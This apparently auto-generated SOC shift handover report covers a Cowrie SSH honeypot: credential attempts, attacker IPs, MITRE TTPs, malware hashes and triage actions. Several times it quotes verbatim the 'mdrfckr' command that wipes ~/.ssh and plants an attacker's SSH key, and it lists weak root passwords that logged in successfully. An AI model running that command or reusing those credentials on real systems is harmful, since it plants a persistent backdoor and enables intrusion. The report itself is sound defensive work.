# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-19 |
| **Generated At** | 2026-04-19T09:00:13Z |
| **Shift Time** | 09:00 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **49** |
| Confirmed Threats | **23** |
| False Positives Filtered | **26** (53.1%) |
| Unique Attacker IPs | **11** |
| Countries of Origin | **7** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **39** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **19** |
| Unique Credential Pairs | **11** |
| Unique Usernames | **5** |
| Unique Passwords | **11** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 5 |
| `vpn` | 2 |
| `test` | 1 |
| `frappe` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `12qwaszx` | 1 |
| `Test5` | 1 |
| `3edc!@#` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `root` | `12qwaszx` | 1 |
| `test` | `Test5` | 1 |
| `root` | `3edc!@#` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `12qwaszx` | `23.91.97.213` | 2026-04-19T07:53:12 |
| `root` | `3245gs5662d34` | `23.91.97.213` | 2026-04-19T07:53:15 |
| `root` | `3edc!@#` | `43.153.12.68` | 2026-04-19T07:53:46 |
| `root` | `xxCC123` | `178.104.68.20` | 2026-04-19T07:53:48 |
| `root` | `3245gs5662d34` | `178.104.68.20` | 2026-04-19T07:53:51 |
| `root` | `3245gs5662d34` | `43.153.12.68` | 2026-04-19T07:53:53 |
| `root` | `1008` | `185.226.89.235` | 2026-04-19T07:57:43 |
| `root` | `3245gs5662d34` | `185.226.89.235` | 2026-04-19T07:57:46 |
| `root` | `zxc,./123` | `185.226.89.235` | 2026-04-19T07:59:17 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **49** |
| Sessions with Fingerprint | **1** |
| Unique HASSH Fingerprints | **1** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 21 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 21 | 6 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 21 | 6 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `23.91.97.213`, `43.153.12.68`, `178.104.68.20`, `185.226.89.235`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **11** |
| Unique ASNs | **10** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS3462` | Data Communication Business Group | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | MEDIUM |
| `AS24940` | Hetzner Online GmbH | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | MEDIUM |
| `AS215025` | NET.COM SHPK | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f672c251f7a8

| Field | Detail |
|---|---|
| **Source IP** | `23.91.97[.]213` |
| **First Seen** | 2026-04-19 07:53 |
| **Last Seen** | 2026-04-19 07:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:53:12` | `cowrie.session.connect` |
| `2026-04-19 07:53:12` | `cowrie.client.version` |
| `2026-04-19 07:53:12` | `cowrie.client.kex` |
| `2026-04-19 07:53:12` | `cowrie.login.success` |
| `2026-04-19 07:53:12` | `cowrie.session.params` |
| `2026-04-19 07:53:12` | `cowrie.command.input` |
| `2026-04-19 07:53:12` | `cowrie.command.failed` |
| `2026-04-19 07:53:12` | `cowrie.log.closed` |
| `2026-04-19 07:53:13` | `cowrie.session.params` |
| `2026-04-19 07:53:13` | `cowrie.command.input` |
| `2026-04-19 07:53:13` | `cowrie.session.file_download` |
| `2026-04-19 07:53:13` | `cowrie.log.closed` |
| `2026-04-19 07:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.91.97[.]213` to AbuseIPDB if not already reported
- [ ] Block `23.91.97[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b560c74a0de0

| Field | Detail |
|---|---|
| **Source IP** | `23.91.97[.]213` |
| **First Seen** | 2026-04-19 07:53 |
| **Last Seen** | 2026-04-19 07:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:53:15` | `cowrie.session.connect` |
| `2026-04-19 07:53:15` | `cowrie.client.version` |
| `2026-04-19 07:53:15` | `cowrie.client.kex` |
| `2026-04-19 07:53:15` | `cowrie.login.success` |
| `2026-04-19 07:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.91.97[.]213` to AbuseIPDB if not already reported
- [ ] Block `23.91.97[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0609bc89ee05

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-19 07:53 |
| **Last Seen** | 2026-04-19 07:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:53:45` | `cowrie.session.connect` |
| `2026-04-19 07:53:45` | `cowrie.client.version` |
| `2026-04-19 07:53:45` | `cowrie.client.kex` |
| `2026-04-19 07:53:46` | `cowrie.login.success` |
| `2026-04-19 07:53:47` | `cowrie.session.params` |
| `2026-04-19 07:53:47` | `cowrie.command.input` |
| `2026-04-19 07:53:47` | `cowrie.command.failed` |
| `2026-04-19 07:53:47` | `cowrie.log.closed` |
| `2026-04-19 07:53:47` | `cowrie.session.params` |
| `2026-04-19 07:53:47` | `cowrie.command.input` |
| `2026-04-19 07:53:48` | `cowrie.session.file_download` |
| `2026-04-19 07:53:48` | `cowrie.log.closed` |
| `2026-04-19 07:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-523530b39181

| Field | Detail |
|---|---|
| **Source IP** | `178.104.68[.]20` |
| **First Seen** | 2026-04-19 07:53 |
| **Last Seen** | 2026-04-19 07:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:53:47` | `cowrie.session.connect` |
| `2026-04-19 07:53:47` | `cowrie.client.version` |
| `2026-04-19 07:53:47` | `cowrie.client.kex` |
| `2026-04-19 07:53:48` | `cowrie.login.success` |
| `2026-04-19 07:53:48` | `cowrie.session.params` |
| `2026-04-19 07:53:48` | `cowrie.command.input` |
| `2026-04-19 07:53:48` | `cowrie.command.failed` |
| `2026-04-19 07:53:48` | `cowrie.log.closed` |
| `2026-04-19 07:53:48` | `cowrie.session.params` |
| `2026-04-19 07:53:48` | `cowrie.command.input` |
| `2026-04-19 07:53:48` | `cowrie.session.file_download` |
| `2026-04-19 07:53:48` | `cowrie.log.closed` |
| `2026-04-19 07:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.104.68[.]20` to AbuseIPDB if not already reported
- [ ] Block `178.104.68[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-910cfd659965

| Field | Detail |
|---|---|
| **Source IP** | `178.104.68[.]20` |
| **First Seen** | 2026-04-19 07:53 |
| **Last Seen** | 2026-04-19 07:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:53:51` | `cowrie.session.connect` |
| `2026-04-19 07:53:51` | `cowrie.client.version` |
| `2026-04-19 07:53:51` | `cowrie.client.kex` |
| `2026-04-19 07:53:51` | `cowrie.login.success` |
| `2026-04-19 07:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.104.68[.]20` to AbuseIPDB if not already reported
- [ ] Block `178.104.68[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1da3e0c2f106

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-19 07:53 |
| **Last Seen** | 2026-04-19 07:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:53:51` | `cowrie.session.connect` |
| `2026-04-19 07:53:51` | `cowrie.client.version` |
| `2026-04-19 07:53:52` | `cowrie.client.kex` |
| `2026-04-19 07:53:53` | `cowrie.login.success` |
| `2026-04-19 07:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82dd27f0b4e1

| Field | Detail |
|---|---|
| **Source IP** | `185.226.89[.]235` |
| **First Seen** | 2026-04-19 07:57 |
| **Last Seen** | 2026-04-19 07:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:57:42` | `cowrie.session.connect` |
| `2026-04-19 07:57:42` | `cowrie.client.version` |
| `2026-04-19 07:57:42` | `cowrie.client.kex` |
| `2026-04-19 07:57:43` | `cowrie.login.success` |
| `2026-04-19 07:57:43` | `cowrie.session.params` |
| `2026-04-19 07:57:43` | `cowrie.command.input` |
| `2026-04-19 07:57:43` | `cowrie.command.failed` |
| `2026-04-19 07:57:43` | `cowrie.log.closed` |
| `2026-04-19 07:57:43` | `cowrie.session.params` |
| `2026-04-19 07:57:43` | `cowrie.command.input` |
| `2026-04-19 07:57:43` | `cowrie.session.file_download` |
| `2026-04-19 07:57:43` | `cowrie.log.closed` |
| `2026-04-19 07:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.226.89[.]235` to AbuseIPDB if not already reported
- [ ] Block `185.226.89[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd1725e47ac7

| Field | Detail |
|---|---|
| **Source IP** | `185.226.89[.]235` |
| **First Seen** | 2026-04-19 07:57 |
| **Last Seen** | 2026-04-19 07:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:57:46` | `cowrie.session.connect` |
| `2026-04-19 07:57:46` | `cowrie.client.version` |
| `2026-04-19 07:57:46` | `cowrie.client.kex` |
| `2026-04-19 07:57:46` | `cowrie.login.success` |
| `2026-04-19 07:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.226.89[.]235` to AbuseIPDB if not already reported
- [ ] Block `185.226.89[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c622731a4c3e

| Field | Detail |
|---|---|
| **Source IP** | `185.226.89[.]235` |
| **First Seen** | 2026-04-19 07:59 |
| **Last Seen** | 2026-04-19 07:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:59:16` | `cowrie.session.connect` |
| `2026-04-19 07:59:16` | `cowrie.client.version` |
| `2026-04-19 07:59:16` | `cowrie.client.kex` |
| `2026-04-19 07:59:17` | `cowrie.login.success` |
| `2026-04-19 07:59:17` | `cowrie.session.params` |
| `2026-04-19 07:59:17` | `cowrie.command.input` |
| `2026-04-19 07:59:17` | `cowrie.command.failed` |
| `2026-04-19 07:59:17` | `cowrie.log.closed` |
| `2026-04-19 07:59:18` | `cowrie.session.params` |
| `2026-04-19 07:59:18` | `cowrie.command.input` |
| `2026-04-19 07:59:18` | `cowrie.session.file_download` |
| `2026-04-19 07:59:18` | `cowrie.log.closed` |
| `2026-04-19 07:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.226.89[.]235` to AbuseIPDB if not already reported
- [ ] Block `185.226.89[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76c25aeaf08d

| Field | Detail |
|---|---|
| **Source IP** | `185.226.89[.]235` |
| **First Seen** | 2026-04-19 07:59 |
| **Last Seen** | 2026-04-19 07:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:59:20` | `cowrie.session.connect` |
| `2026-04-19 07:59:20` | `cowrie.client.version` |
| `2026-04-19 07:59:20` | `cowrie.client.kex` |
| `2026-04-19 07:59:21` | `cowrie.login.success` |
| `2026-04-19 07:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.226.89[.]235` to AbuseIPDB if not already reported
- [ ] Block `185.226.89[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `185.226.89[.]235` | **6** | 2026-04-19 07:53 | 2026-04-19 08:03 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.118[.]114` | 1 | 2026-04-19 07:57 | 2026-04-19 07:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `162.243.208[.]127` | 1 | 2026-04-19 08:12 | 2026-04-19 08:12 | 2s | 0 | `T1592` | 🟢 LOW |
| `178.104.68[.]20` | 1 | 2026-04-19 07:53 | 2026-04-19 07:53 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.134.251[.]17` | 1 | 2026-04-19 08:23 | 2026-04-19 08:23 | 30s | 0 | `T1592` | 🟢 LOW |
| `23.91.97[.]213` | 1 | 2026-04-19 07:53 | 2026-04-19 07:53 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.128.160[.]208` | 1 | 2026-04-19 07:53 | 2026-04-19 07:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.153.12[.]68` | 1 | 2026-04-19 07:53 | 2026-04-19 07:53 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `178.104.68[.]20` | DE | Hetzner Online GmbH | **100** ⚠️ | 0 |
| `162.243.208[.]127` | US | DigitalOcean, LLC | **100** ⚠️ | 28 |
| `220.134.251[.]17` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 21 |
| `185.226.89[.]235` | AL | NET.COM SHPK | **100** ⚠️ | 50 |
| `27.128.160[.]208` | CN | CHINANET hebei province network | **100** ⚠️ | 50 |
